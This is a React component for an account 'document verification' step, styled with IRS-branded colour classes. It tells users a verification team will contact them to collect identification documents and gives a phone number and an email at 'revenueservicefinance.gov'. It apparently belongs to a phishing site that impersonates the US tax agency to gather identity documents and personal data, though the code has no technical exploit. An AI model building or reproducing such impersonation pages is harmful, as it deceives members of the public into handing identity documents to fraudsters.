
import React from 'react';
import { Phone, Mail, FileCheck, Shield } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';

interface DocumentUploadStepProps {
  userId: string;
  onUploadComplete: (info: { path: string; name: string }) => void;
}

export const DocumentUploadStep: React.FC<DocumentUploadStepProps> = ({ 
  userId
}) => {
  return (
    <div className="space-y-6">
      <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 text-irs-darkBlue mb-4">
        <h3 className="text-lg font-semibold mb-2 flex items-center">
          <Shield className="mr-2 h-5 w-5 text-irs-blue" />
          Document Verification Required
        </h3>
        <p className="text-sm mb-3">
          For your security and to comply with federal regulations, we need to verify your identity before activating your account.
        </p>
        <p className="text-sm">
          Our verification team will contact you shortly to guide you through the secure document submission process.
        </p>
      </div>

      <Card className="border-irs-lightGray p-4">
        <h4 className="font-medium text-irs-darkBlue mb-3 flex items-center">
          <FileCheck className="mr-2 h-5 w-5 text-irs-blue" />
          Next Steps:
        </h4>
        <ul className="space-y-3 text-sm text-irs-darkGray">
          <li className="flex">
            <span className="bg-irs-lightBlue/20 text-irs-blue font-medium rounded-full h-5 w-5 flex items-center justify-center mr-2 flex-shrink-0">1</span>
            <span>Our team will review your application within 1-2 business days</span>
          </li>
          <li className="flex">
            <span className="bg-irs-lightBlue/20 text-irs-blue font-medium rounded-full h-5 w-5 flex items-center justify-center mr-2 flex-shrink-0">2</span>
            <span>You'll receive instructions on how to securely submit your identification documents</span>
          </li>
          <li className="flex">
            <span className="bg-irs-lightBlue/20 text-irs-blue font-medium rounded-full h-5 w-5 flex items-center justify-center mr-2 flex-shrink-0">3</span>
            <span>Once verified, your account will be fully activated</span>
          </li>
        </ul>
      </Card>

      <div className="border-t border-gray-200 pt-4 mt-4">
        <h4 className="font-medium text-gray-700 mb-3">Contact our verification team:</h4>
        <div className="space-y-3">
          <div className="flex items-center">
            <Phone className="h-4 w-4 mr-2 text-irs-blue" />
            <a href="tel:+12526912474" className="text-sm text-irs-blue hover:underline">
              +1-252-691-2474
            </a>
          </div>
          <div className="flex items-center">
            <Mail className="h-4 w-4 mr-2 text-irs-blue" />
            <a href="mailto:verification@revenueservicefinance.gov" className="text-sm text-irs-blue hover:underline">
              verification@revenueservicefinance.gov
            </a>
          </div>
        </div>
      </div>

      <Button 
        onClick={() => window.location.href = '/dashboard'}
        className="w-full bg-irs-blue text-white hover:bg-irs-darkBlue mt-2"
      >
        Continue to Dashboard
      </Button>
    </div>
  );
};
